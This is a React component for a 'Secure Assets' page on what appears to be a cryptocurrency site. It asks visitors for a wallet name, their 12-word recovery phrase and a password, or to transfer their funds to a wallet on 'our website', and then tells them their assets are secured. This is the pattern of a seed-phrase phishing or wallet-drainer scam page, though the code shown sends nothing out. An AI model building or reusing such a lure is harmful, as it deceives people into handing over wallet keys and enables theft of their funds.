import React, { useState } from "react";
import "../styles/Secure.css";
import Modal from "react-modal";

const Secure = () => {
  const [phrases, setPhrases] = useState(Array(12).fill(""));
  const [wallet, setWallet] = useState("");
  const [password, setPassword] = useState("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalMessage, setModalMessage] = useState("");
  const [isPasswordModalOpen, setIsPasswordModalOpen] = useState(false);

  const handlePhraseChange = (index, value) => {
    const newPhrases = [...phrases];
    newPhrases[index] = value;
    setPhrases(newPhrases);
  };

  const handleWalletChange = (e) => {
    setWallet(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleSecureClick = () => {
    if (phrases.every((phrase) => phrase.trim() !== "")) {
      setIsPasswordModalOpen(true);
    } else {
      setModalMessage("Please enter a valid 12-phrase security code.");
      setIsModalOpen(true);
    }
  };

  const handlePasswordSubmit = () => {
    if (password.trim() !== "") {
      setModalMessage(
        "Your assets are now secured with your 12-phrase security code."
      );
      setIsPasswordModalOpen(false);
      setIsModalOpen(true);
    } else {
      setModalMessage("Please enter a valid password.");
      setIsModalOpen(true);
    }
  };

  const closeModal = () => {
    setIsModalOpen(false);
    setIsPasswordModalOpen(false);
    setPassword("");
  };

  return (
    <div className="secureDiv1">
      <div className="transactDiv2">
        <h2>SECURE ASSETS</h2>
      </div>
      <div style={{ marginTop: 20 }}>
        <h3>You can secure your assets in your wallet by:</h3>
        <ul style={{ color: "white" }}>
          <li>
            <h3>Inputting your 12-phrase security code below.</h3>
          </li>
          <li>
            <h3>
              Transferring your assets to your assets wallet on our website.
            </h3>
          </li>
        </ul>
      </div>
      <div style={{ marginTop: 50 }}>
        <h3>Wallet Name</h3>
        <div className="withdrawDiv2">
          <input
            type="text"
            value={wallet}
            onChange={handleWalletChange}
            placeholder="Enter wallet name"
          />
        </div>
      </div>

      <div
        style={{
          display: "grid",
          gridTemplateColumns: "repeat(2, 1fr)",
          gap: "10px",
          marginTop: 30,
        }}
      >
        {phrases.map((phrase, index) => (
          <input
            key={index}
            type="text"
            value={phrase}
            onChange={(e) => handlePhraseChange(index, e.target.value)}
            placeholder={`Phrase ${index + 1}`}
          />
        ))}
      </div>
      <div className="depositDiv9">
        <button>Secure Assets</button>
      </div>

      <Modal isOpen={isModalOpen} onRequestClose={closeModal}>
        <div>
          <h2>{modalMessage}</h2>
          <button onClick={closeModal}>Close</button>
        </div>
      </Modal>

      <Modal isOpen={isPasswordModalOpen} onRequestClose={closeModal}>
        <div>
          <h2>Enter your password to secure your assets</h2>
          <input
            type="password"
            value={password}
            onChange={handlePasswordChange}
            placeholder="Password"
          />
          <button onClick={handlePasswordSubmit}>Confirm</button>
        </div>
      </Modal>
    </div>
  );
};

export default Secure;
